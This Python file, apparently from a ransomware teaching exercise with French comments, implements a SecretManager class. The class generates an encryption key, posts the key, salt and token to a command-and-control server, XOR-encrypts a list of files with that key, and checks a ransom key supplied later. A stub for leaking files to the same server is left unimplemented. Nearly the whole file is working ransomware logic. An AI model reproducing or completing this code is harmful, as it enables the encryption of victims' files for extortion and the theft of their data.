from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        derived_key = kdf.derive(key)
        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.TOKEN_LENGTH)
        token = self.do_derivation(salt, key)
        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Failed to send data to CNC: {response.text}")
        else:
            self._log.info("Data sent to CNC successfully")

    def setup(self) -> None:
        # Vérification de l'existence d'un fichier self._token.bin
        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
            raise FileExistsError("Un fichier _token.bin existe déjà. Annulation du setup.")
        

        # Création des éléments cryptographiques
        self._salt, self._key, self._token = self.create()
        # Création du répertoire si nécessaire
        os.makedirs(self._path, exist_ok=True)
        # Sauvegarde du sel et du self._token en local
        with open(os.path.join(self._path, "_salt.bin"), "wb") as self._salt_file:
            self._salt_file.write(self._salt)
        with open(os.path.join(self._path, "_token.bin"), "wb") as self._token_file:
            self._token_file.write(self._token)

        # Envoi des éléments cryptographiques au CNC
        self.post_new(self._salt, self._key, self._token)

    def load(self) -> None:
        salt_path = os.path.join(self._path, "_salt.bin")
        token_path = os.path.join(self._path, "_token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
            with open(token_path, "rb") as token_file:
                self._token = token_file.read()
        else:
            self._log.warning("Les fichiers _salt.bin et/ou _token.bin n'existent pas. Impossible de charger les données cryptographiques.")



    def check_key(self, candidate_key: bytes) -> bool:
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token


    def set_key(self, b64_key: str) -> None:
        candidate_key = base64.b64decode(b64_key)
        
        if self.check_key(candidate_key):
            self._key = candidate_key
        else:
            raise ValueError("La clé fournie est invalide.")


    def get_hex_token(self) -> str:
        token_hash = sha256(self._token).hexdigest()
        return token_hash

    def xorfiles(self, files: List[str]) -> None:
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self) -> None:
        # Remove local cryptographic data (salt.bin and token.bin)
        salt_path = os.path.join(self._path, "_salt.bin")
        token_path = os.path.join(self._path, "_token.bin")

        try:
            if os.path.exists(salt_path):
                os.remove(salt_path)
                self._log.info("Removed _salt.bin file.")
            else:
                self._log.warning("_salt.bin file does not exist.")
        except Exception as e:
            self._log.error(f"Error while removing _salt.bin file: {e}")

        try:
            if os.path.exists(token_path):
                os.remove(token_path)
                self._log.info("Removed _token.bin file.")
            else:
                self._log.warning("_token.bin file does not exist.")
        except Exception as e:
            self._log.error(f"Error while removing _token.bin file: {e}")

        # Clear in-memory data
        self._salt = None
        self._token = None
        self._key = None